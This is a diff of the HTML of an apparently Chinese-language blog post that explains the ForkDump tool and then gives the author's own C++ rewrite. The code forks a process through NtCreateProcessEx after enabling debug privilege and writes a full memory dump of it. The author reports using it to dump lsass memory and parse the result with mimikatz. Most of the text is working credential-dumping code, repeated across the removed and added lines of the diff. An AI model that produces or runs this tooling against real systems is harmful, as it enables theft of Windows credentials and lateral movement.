+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>BOOL
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">EscalateDebugPrivilege</span> (
+</span></span><span style="display:flex;"><span>    VOID
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    BOOL result;
+</span></span><span style="display:flex;"><span>    HANDLE currentToken;
+</span></span><span style="display:flex;"><span>    LUID currentDebugValue;
+</span></span><span style="display:flex;"><span>    TOKEN_PRIVILEGES newTokenPrivilege;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>    currentToken <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Open the current processes&#39; token.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES <span style="color:#f92672">|</span> TOKEN_QUERY, <span style="color:#f92672">&amp;</span>currentToken) <span style="color:#f92672">==</span> FALSE)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Failed to open the token of the current process with the last error %i.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> Exit;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Lookup the LUID of the debug privilege.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, <span style="color:#f92672">&amp;</span>currentDebugValue) <span style="color:#f92672">==</span> FALSE)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Failed to lookup the current debug privilege with the last error %i.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>        CloseHandle(currentToken);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> Exit;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Create our elevated token privilege.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    newTokenPrivilege.PrivilegeCount <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    newTokenPrivilege.Privileges[<span style="color:#ae81ff">0</span>].Luid <span style="color:#f92672">=</span> currentDebugValue;
+</span></span><span style="display:flex;"><span>    newTokenPrivilege.Privileges[<span style="color:#ae81ff">0</span>].Attributes <span style="color:#f92672">=</span> SE_PRIVILEGE_ENABLED;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Adjust the current processes&#39; token.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (AdjustTokenPrivileges(currentToken, FALSE, <span style="color:#f92672">&amp;</span>newTokenPrivilege, <span style="color:#66d9ef">sizeof</span>(newTokenPrivilege), NULL, NULL) <span style="color:#f92672">==</span> FALSE <span style="color:#f92672">||</span> 
+</span></span><span style="display:flex;"><span>        GetLastError() <span style="color:#f92672">!=</span> ERROR_SUCCESS)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Failed to adjust debug privileges with the last error %i.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>        CloseHandle(currentToken);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> Exit;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>Exit:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (currentToken)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        CloseHandle(currentToken);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> returnCode;
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>string targetProcessIdStr;
+</span></span><span style="display:flex;"><span>    ULONG targetProcessId;
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>string dumpFileName;
+</span></span><span style="display:flex;"><span>    HANDLE dumpFile;
+</span></span><span style="display:flex;"><span>    ForkSnapshot<span style="color:#f92672">*</span> snapshot;
+</span></span><span style="display:flex;"><span>    HANDLE snapshotProcess;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    dumpFile <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    snapshotProcess <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    snapshot <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    returnCode <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Ensure we have the expected arguments.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;ForkDump.exe [dump file name] [target process ID]</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Retrieve and parse the arguments.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    dumpFileName <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>    targetProcessIdStr <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>    targetProcessId <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>stoi(targetProcessIdStr);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Create the dump file.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    dumpFile <span style="color:#f92672">=</span> CreateFileA(dumpFileName.c_str(), GENERIC_ALL, <span style="color:#ae81ff">0</span>, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (dumpFile <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Failed to open dump file %s with the last error %i.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>, dumpFileName.c_str(), GetLastError());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> Exit;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Create a fork snapshot of the target.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    snapshot <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ForkSnapshot(targetProcessId);
+</span></span><span style="display:flex;"><span>    snapshotProcess <span style="color:#f92672">=</span> snapshot<span style="color:#f92672">-&gt;</span>TakeSnapshot();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (snapshotProcess <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// If our first try fails, attempt to escalate our debug privilege.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        printf(<span style="color:#e6db74">&#34;Failed to take a snapshot of the target process. Attempting to escalate debug privilege...</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (EscalateDebugPrivilege() <span style="color:#f92672">==</span> FALSE)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">&#34;Failed to escalate debug privileges, are you running ForkDump as Administrator?</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">goto</span> Exit;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// Retry with debug privileges.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        printf(<span style="color:#e6db74">&#34;Escalated debug privileges, attempting to take another snapshot.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
+</span></span><span style="display:flex;"><span>        snapshot<span style="color:#f92672">-&gt;</span>CleanSnapshot();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">delete</span> snapshot;
+</span></span><span style="display:flex;"><span>        snapshot <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ForkSnapshot(targetProcessId);
+</span></span><span style="display:flex;"><span>        snapshotProcess <span style="color:#f92672">=</span> snapshot<span style="color:#f92672">-&gt;</span>TakeSnapshot();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (snapshotProcess <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">// If we failed once again, this likely means that there is a difference in process privileges or the handle was stripped.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            printf(<span style="color:#e6db74">&#34;Second attempt at taking a snapshot of the target failed. It is likely that there is a difference in process privilege or the handle was stripped.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">goto</span> Exit;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Create a dump of the forked process.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (MiniDumpWriteDump(snapshotProcess, GetProcessId(snapshotProcess), dumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL) <span style="color:#f92672">==</span> FALSE)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Failed to create a dump of the forked process with the last error %i.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> Exit;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    returnCode <span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Successfully dumped process %i to %s!</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>, targetProcessId, dumpFileName.c_str());
+</span></span><span style="display:flex;"><span>Exit:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (dumpFile <span style="color:#f92672">!=</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        CloseHandle(dumpFile);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (snapshot <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        snapshot<span style="color:#f92672">-&gt;</span>CleanSnapshot();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">delete</span> snapshot;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> returnCode;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>EscalateDebugPrivilege</code>没啥好说的 提升权限的函数，也可以用<code>RtlAdjustPrivilege</code>进行提权</p>
 <p>然后看下main函数</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">	<span style="color:#66d9ef">int</span> returnCode;
-    std<span style="color:#f92672">::</span>string targetProcessIdStr;
-    ULONG targetProcessId;
-    std<span style="color:#f92672">::</span>string dumpFileName;
-    HANDLE dumpFile;
-    ForkSnapshot<span style="color:#f92672">*</span> snapshot;
-    HANDLE snapshotProcess;
-
-    dumpFile <span style="color:#f92672">=</span> NULL;
-    snapshotProcess <span style="color:#f92672">=</span> NULL;
-    snapshot <span style="color:#f92672">=</span> NULL;
-    returnCode <span style="color:#f92672">=</span> FALSE;
-
-    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Ensure we have the expected arguments.
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>)
-    {
-        printf(<span style="color:#e6db74">&#34;ForkDump.exe [dump file name] [target process ID]</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-    }
-
-    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Retrieve and parse the arguments.
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    dumpFileName <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
-    targetProcessIdStr <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">2</span>];
-    targetProcessId <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>stoi(targetProcessIdStr);
-</code></pre></div><p>我觉得这几个应该就不用说了，主要看功能</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">dumpFile <span style="color:#f92672">=</span> CreateFileA(dumpFileName.c_str(), GENERIC_ALL, <span style="color:#ae81ff">0</span>, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-</code></pre></div><p>先打开一个文件，用于我们写入dump后的内存，然后就是判断是否打开</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> returnCode;
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>string targetProcessIdStr;
+</span></span><span style="display:flex;"><span>    ULONG targetProcessId;
+</span></span><span style="display:flex;"><span>    std<span style="color:#f92672">::</span>string dumpFileName;
+</span></span><span style="display:flex;"><span>    HANDLE dumpFile;
+</span></span><span style="display:flex;"><span>    ForkSnapshot<span style="color:#f92672">*</span> snapshot;
+</span></span><span style="display:flex;"><span>    HANDLE snapshotProcess;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    dumpFile <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    snapshotProcess <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    snapshot <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    returnCode <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Ensure we have the expected arguments.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;ForkDump.exe [dump file name] [target process ID]</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Retrieve and parse the arguments.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    dumpFileName <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>    targetProcessIdStr <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>    targetProcessId <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>stoi(targetProcessIdStr);
+</span></span></code></pre></div><p>我觉得这几个应该就不用说了，主要看功能</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>dumpFile <span style="color:#f92672">=</span> CreateFileA(dumpFileName.c_str(), GENERIC_ALL, <span style="color:#ae81ff">0</span>, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+</span></span></code></pre></div><p>先打开一个文件，用于我们写入dump后的内存，然后就是判断是否打开</p>
 <p><code>snapshot = new ForkSnapshot(targetProcessId);</code>，这个就是调用了<code>ForkSnapshot</code>的构造方法 然后打开这个进程</p>
 <p><code>snapshotProcess = snapshot-&gt;TakeSnapshot();</code>然后调用这个函数，把用<code>NtCreateProcessEx</code>打开后的句柄赋值给<code>snapshotProcess</code></p>
 <p>然后判断句柄的情况，如果不行就找问题，有权限不足？然后如果提权成功了就再次走一圈上面那行，如果还不行就直接退出了</p>
@@ -594,99 +594,99 @@ Exit:
 <blockquote>
 <p>确实可以 然后开始自写</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#pragma once
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Dbghelp.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#pragma comment(lib, &#34;ntdll.lib&#34;)
-</span><span style="color:#75715e">#pragma comment(lib,&#34;Dbghelp.lib&#34;)
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">NTSTATUS</span>(WINAPI<span style="color:#f92672">*</span> _RtlAdjustPrivilege)(ULONG Privilege, BOOL Enable, BOOL CurrentThread, PULONG Enabled);
-
-<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_UNICODE_STRING</span> {
-    USHORT Length;
-    USHORT MaximumLength;
-    PWSTR  Buffer;
-} UNICODE_STRING, <span style="color:#f92672">*</span> PUNICODE_STRING;
-
-<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_OBJECT_ATTRIBUTES</span>
-{
-    ULONG Length;
-    PVOID RootDirectory;
-    PUNICODE_STRING ObjectName;
-    ULONG Attributes;
-    PVOID SecurityDescriptor;
-    PVOID SecurityQualityOfService;
-} OBJECT_ATTRIBUTES, <span style="color:#f92672">*</span> POBJECT_ATTRIBUTES;
-
-<span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">NTSTATUS</span>(NTAPI<span style="color:#f92672">*</span> fpNtCreateProcessEx)
-(
-    OUT PHANDLE     ProcessHandle,
-    IN ACCESS_MASK  DesiredAccess,
-    IN POBJECT_ATTRIBUTES ObjectAttributes  OPTIONAL,
-    IN HANDLE   ParentProcess,
-    IN ULONG    Flags,
-    IN HANDLE SectionHandle     OPTIONAL,
-    IN HANDLE DebugPort     OPTIONAL,
-    IN HANDLE ExceptionPort     OPTIONAL,
-    IN BOOLEAN  InJob
-);
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Clean</span>(HANDLE processHandle, HANDLE lsassHandle, HANDLE dumpFile) {
-	processHandle <span style="color:#f92672">=</span> NULL;
-	CloseHandle(processHandle);
-	lsassHandle <span style="color:#f92672">=</span> NULL;
-	CloseHandle(lsassHandle);
-	dumpFile <span style="color:#f92672">=</span> NULL;
-	CloseHandle(dumpFile);
-}
-
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
-	ULONG t <span style="color:#f92672">=</span> NULL;
-	_RtlAdjustPrivilege RtlAdjustPrivilege;
-	RtlAdjustPrivilege <span style="color:#f92672">=</span> (_RtlAdjustPrivilege)GetProcAddress(LoadLibraryA(<span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;RtlAdjustPrivilege&#34;</span>);
-
-	HANDLE processHandle <span style="color:#f92672">=</span> NULL;
-	HANDLE lsassHandle <span style="color:#f92672">=</span> NULL;
-	HANDLE dumpFile <span style="color:#f92672">=</span> NULL;
-	<span style="color:#66d9ef">if</span> (argc<span style="color:#f92672">!=</span><span style="color:#ae81ff">3</span>)
-	{
-		printf(<span style="color:#e6db74">&#34;fork-dump-lsass.exe [dump file name] [target process ID]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-	}
-
-	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> dumpFileName <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
-	<span style="color:#66d9ef">int</span> pid <span style="color:#f92672">=</span> atoi(argv[<span style="color:#ae81ff">2</span>]);
-	dumpFile <span style="color:#f92672">=</span> CreateFileA(dumpFileName, GENERIC_ALL, <span style="color:#ae81ff">0</span>, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	<span style="color:#66d9ef">if</span> (dumpFile <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
-	{
-		printf(<span style="color:#e6db74">&#34;CreateFile Failed: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,GetLastError);
-		Clean(processHandle, lsassHandle, lsassHandle);
-		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-	}
-
-	RtlAdjustPrivilege(<span style="color:#ae81ff">20</span>, TRUE, FALSE, <span style="color:#f92672">&amp;</span>t);
-	lsassHandle <span style="color:#f92672">=</span> OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid);
-	fpNtCreateProcessEx _NtCreateProcessEx <span style="color:#f92672">=</span> (fpNtCreateProcessEx)GetProcAddress(LoadLibraryA(<span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;NtCreateProcessEx&#34;</span>);
-	NTSTATUS status <span style="color:#f92672">=</span> _NtCreateProcessEx(<span style="color:#f92672">&amp;</span>processHandle,PROCESS_ALL_ACCESS,NULL, lsassHandle,<span style="color:#ae81ff">0</span>,NULL,NULL,NULL,<span style="color:#ae81ff">0</span>);
-	<span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x00000000</span>)
-	{
-		printf(<span style="color:#e6db74">&#34;NtCreateProcessEx Failed: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
-		Clean(processHandle, lsassHandle, lsassHandle);
-		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-	}
-
-	<span style="color:#66d9ef">if</span> (MiniDumpWriteDump(processHandle, GetProcessId(processHandle), dumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL) <span style="color:#f92672">==</span> FALSE)
-	{
-		printf(<span style="color:#e6db74">&#34;MiniDumpWriteDump Failed: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
-		Clean(processHandle, lsassHandle, lsassHandle);
-		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;;
-	}
-	printf(<span style="color:#e6db74">&#34;sucess!&#34;</span>);
-
-	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-}
-</code></pre></div><p>编译后，尝试运行；运行成功dump出了lsass的内存，然后让<code>mimikatz</code>进行解析</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#pragma once
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Dbghelp.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib, &#34;ntdll.lib&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib,&#34;Dbghelp.lib&#34;)
